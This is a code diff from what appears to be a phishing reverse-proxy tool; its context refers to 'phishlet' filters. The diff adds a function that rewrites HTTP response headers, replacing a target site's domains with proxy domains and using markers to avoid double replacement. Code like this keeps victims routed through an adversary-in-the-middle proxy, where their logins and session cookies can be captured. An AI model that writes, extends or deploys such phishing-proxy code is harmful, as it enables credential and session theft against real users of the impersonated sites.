@@ -442,3 +442,60 @@ def process_phishlet_filters(phishlet_data, request_path, debug_log=None):
                 debug_log(f"  Skipping non-URL filter: {filter_item.get('type')}", "DEBUG")
     
     return filter_replacements
+
+
+def patch_response_header_2(patched_headers, ordered_replacements, debug_log=None):
+    """
+    Apply additional header replacements based on ordered_replacements.
+    Uses a marker-based approach to prevent double replacements.
+    
+    Args:
+        patched_headers: Dictionary of headers to be modified
+        ordered_replacements: List of tuples (target, proxy) for replacements
+        debug_log: Optional debug logging function
+    
+    Returns:
+        dict: Modified headers with replacements applied
+    """
+    if not ordered_replacements:
+        return patched_headers
+    
+    if debug_log:
+        debug_log(f"  Applying ordered replacements to patched headers: --------\n --------------------------------")
+    
+    import re
+    
+    for key, value in patched_headers.items():
+        if not isinstance(value, str):
+            continue
+            
+        # Use a marker-based approach to prevent double replacements
+        new_value = value
+        marker_map = {}
+        
+        # Step 1: Replace each target with a unique marker
+        for i, (target, proxy) in enumerate(ordered_replacements):
+            if target in new_value:
+                marker = f"__HEADER_REPLACEMENT_MARKER_{i}__"
+                marker_map[marker] = proxy
+                new_value = new_value.replace(target, marker)
+                if debug_log:
+                    debug_log(f"  Replaced in patched header {key}: {target} -> {marker}", "DEBUG")
+        
+        # Step 2: Replace all markers with their final values
+        for marker, proxy in marker_map.items():
+            new_value = new_value.replace(marker, proxy)
+        
+        # Update the patched header if any replacements were made
+        if new_value != value:
+            patched_headers[key] = new_value
+            if debug_log:
+                debug_log(f"  Final patched header {key}: {value} -> {new_value}", "DEBUG")
+    
+    if debug_log:
+        debug_log(f"  Applied ordered replacements to patched headers: --------\n --------------------------------")
+        debug_log(f"  Final patched headers: --------\n --------------------------------")
+        debug_log(f"  {patched_headers}", "DEBUG")
+        debug_log(f"  --------------------------------")
+    
+    return patched_headers
